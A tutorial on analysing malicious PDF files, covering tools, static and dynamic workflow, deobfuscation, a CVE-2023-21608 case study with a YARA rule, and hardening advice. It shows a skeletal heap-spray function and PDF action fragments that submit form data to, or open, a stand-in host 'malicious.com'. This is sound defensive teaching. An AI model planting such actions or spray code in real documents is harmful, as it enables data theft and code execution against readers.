# Practical Guide to PDF Malware Analysis

## Introduction

PDF (Portable Document Format) files are commonly used for document sharing across different platforms. However, their complex structure and support for embedded content like JavaScript, forms, and multimedia make them attractive vectors for malware delivery. This guide provides a systematic approach to analyzing potentially malicious PDF files.

## Prerequisites

### Tools

1. **Static Analysis Tools**
   - **pdfid.py** - Identifies suspicious elements in PDF files
   - **pdf-parser.py** - Parses and analyzes PDF structure
   - **peepdf** - Python tool for exploring PDF files
   - **pdfexaminer.com** - Online PDF analysis service
   - **YARA** - Pattern matching tool for malware detection

2. **Dynamic Analysis Environment**
   - Isolated virtual machine with monitoring tools
   - Adobe Reader/Acrobat (various versions)
   - Process Monitor, Process Explorer
   - Wireshark for network traffic analysis
   - INetSim for simulating internet services

3. **JavaScript Analysis Tools**
   - **SpiderMonkey** - JavaScript engine for deobfuscation
   - **Node.js** - For running and analyzing JavaScript
   - **JavaScript Beautifier** - For code formatting
   - **CyberChef** - For decoding and deobfuscation

## Analysis Workflow

### 1. Initial Assessment

1. **Calculate file hashes**
   ```bash
   sha256sum suspicious.pdf
   md5sum suspicious.pdf
   ```

2. **Check file reputation**
   - Submit hashes to VirusTotal
   - Check against threat intelligence feeds

3. **Examine file metadata**
   ```bash
   exiftool suspicious.pdf
   ```

### 2. Static Analysis

1. **Identify suspicious elements with pdfid.py**
   ```bash
   pdfid.py suspicious.pdf
   ```
   
   Look for these suspicious indicators:
   - `/JS` or `/JavaScript` - Embedded JavaScript
   - `/AA` - Additional Actions
   - `/OpenAction` - Actions performed when PDF is opened
   - `/Launch` - Can launch external applications
   - `/URI` - Contains URLs
   - `/EmbeddedFile` - Contains embedded files
   - `/XFA` - XML Forms Architecture
   - `/AcroForm` - Contains interactive forms

2. **Analyze PDF structure with pdf-parser.py**
   ```bash
   pdf-parser.py --stats suspicious.pdf
   ```
   
   Examine suspicious objects:
   ```bash
   pdf-parser.py --object [object_id] suspicious.pdf
   ```

3. **Extract and analyze JavaScript**
   ```bash
   pdf-parser.py --object [js_object_id] --raw --filter suspicious.pdf > extracted_js.js
   ```
   
   For all JavaScript:
   ```bash
   pdf-parser.py --search JavaScript suspicious.pdf
   ```

4. **Extract embedded files**
   ```bash
   pdf-parser.py --object [embedded_file_object_id] --raw --filter suspicious.pdf > extracted_file
   ```

5. **Analyze with peepdf**
   ```bash
   peepdf -i suspicious.pdf
   ```
   
   Common peepdf commands:
   ```
   info - Show document information
   object [id] - Show object information
   stream [id] - Show stream content
   js_analyse [id] - Analyze JavaScript
   ```

### 3. JavaScript Analysis

1. **Beautify and format JavaScript**
   ```bash
   js-beautify extracted_js.js > formatted_js.js
   ```

2. **Identify obfuscation techniques**
   - Array-based obfuscation (`var _0x1234 = ['string1', 'string2', ...]`)
   - String manipulation (`String.fromCharCode()`, `charCodeAt()`)
   - Encoding (Base64, hex, custom encoding)
   - Eval chains (`eval(function(p,a,c,k,e,d){...})`)

3. **Deobfuscate JavaScript**
   - Replace array references with actual values
   - Resolve string manipulations
   - Decode encoded strings
   - Use CyberChef for complex deobfuscation

4. **Identify malicious behaviors**
   - Heap spraying techniques
   - Exploitation of known vulnerabilities
   - Shellcode presence
   - Network communication (URLs, IP addresses)
   - DOM manipulation
   - Use of suspicious APIs

### 4. Dynamic Analysis

1. **Prepare analysis environment**
   - Use an isolated VM with vulnerable Adobe Reader version
   - Configure network monitoring (Wireshark, INetSim)
   - Set up process monitoring (ProcMon, ProcExp)
   - Take VM snapshot before execution

2. **Execute the PDF**
   - Open the PDF in Adobe Reader
   - Monitor for:
     - New processes
     - File system changes
     - Registry modifications
     - Network connections
     - Memory modifications

3. **Capture and analyze artifacts**
   - Dropped files
   - Modified registry keys
   - Network traffic
   - Process memory dumps

### 5. Vulnerability Identification

1. **Identify targeted vulnerabilities**
   - Compare code with known exploits
   - Check CVE references for Adobe Reader
   - Analyze exploitation techniques

2. **Common PDF vulnerabilities**
   - Use-after-free vulnerabilities
   - Buffer overflows
   - Type confusion issues
   - JavaScript engine vulnerabilities
   - Heap spray techniques

### 6. Payload Analysis

1. **Extract final payload**
   - From dropped files
   - From memory dumps
   - From network traffic

2. **Analyze payload functionality**
   - Reverse engineer executable files
   - Identify C2 communication
   - Determine malware family
   - Document capabilities and behaviors

## Common PDF Exploitation Techniques

### 1. JavaScript Exploitation

```javascript
// Example of heap spray in PDF JavaScript
function heapSpray() {
    var payload = unescape("%u4141%u4141%u4242%u4242");
    var nopSlide = unescape("%u9090%u9090%u9090%u9090");
    
    while (nopSlide.length < 0x80000) {
        nopSlide += nopSlide;
    }
    
    var heapBlocks = new Array(0x1000);
    for (var i = 0; i < heapBlocks.length; i++) {
        heapBlocks[i] = nopSlide + payload;
    }
}
```

### 2. Embedded File Execution

PDF files can contain embedded files that are executed when the document is opened:

```
/Type /Filespec
/F (malicious.exe)
/EF << /F [object_id] 0 R >>
```

### 3. Form Submission Attacks

PDF forms can be configured to automatically submit data to external servers:

```
/AcroForm << /Fields [...] /NeedAppearances true >>
/Fields [...]
/A << /S /SubmitForm /F (http://malicious.com/collect.php) >>
```

### 4. URI Handling Exploitation

PDFs can contain URI actions that open external resources:

```
/A << /S /URI /URI (http://malicious.com/exploit) >>
```

## Case Study: CVE-2023-21608 Exploitation

### Vulnerability Details

CVE-2023-21608 is a use-after-free vulnerability in Adobe Reader's JavaScript engine that allows attackers to execute arbitrary code.

### Exploitation Chain

1. **Initial Access**: User opens malicious PDF
2. **Trigger**: JavaScript in OpenAction executes automatically
3. **Exploitation**: Use-after-free vulnerability is triggered
4. **Execution**: Shellcode runs and downloads second-stage payload
5. **Persistence**: Malware establishes persistence on the system

### Detection

YARA rule for detecting this exploit:

```
rule PDF_CVE_2023_21608_Exploit {
    meta:
        description = "Detects PDF files exploiting CVE-2023-21608"
        severity = "Critical"
    
    strings:
        $pdf_header = "%PDF"
        $js_tag = "/JavaScript"
        $exploit1 = "delete target.prop"
        $exploit2 = "collectGarbage"
        $exploit3 = "toString"
        
    condition:
        $pdf_header at 0 and $js_tag and 2 of ($exploit*)
}
```

## Best Practices for PDF Security

1. **Keep PDF readers updated** with the latest security patches
2. **Disable JavaScript** in PDF readers when not needed
3. **Use Protected View** or sandboxing features
4. **Implement content disarm and reconstruction (CDR)** for PDF files
5. **Scan PDF files** with security tools before opening
6. **Use application whitelisting** to control PDF reader execution
7. **Train users** to recognize suspicious PDF documents

## Conclusion

PDF malware analysis requires a systematic approach combining static and dynamic analysis techniques. By understanding the PDF file structure, JavaScript obfuscation methods, and common exploitation techniques, analysts can effectively identify and mitigate threats delivered through PDF files.

Remember that malicious PDFs often use multiple layers of obfuscation and evasion techniques, so a thorough analysis using multiple tools and approaches is essential for accurate detection and classification.

## References

1. Adobe Security Bulletins: https://helpx.adobe.com/security/products/acrobat.html
2. Didier Stevens' PDF Tools: https://blog.didierstevens.com/programs/pdf-tools/
3. MITRE ATT&CK, "Exploit Protection Bypass Techniques": https://attack.mitre.org/techniques/T1211/
4. "The PDF File Format: A Weapon of Choice for Attackers" - FireEye, 2019
5. "Malicious Documents: PDF Analysis Techniques" - SANS Institute, 2022
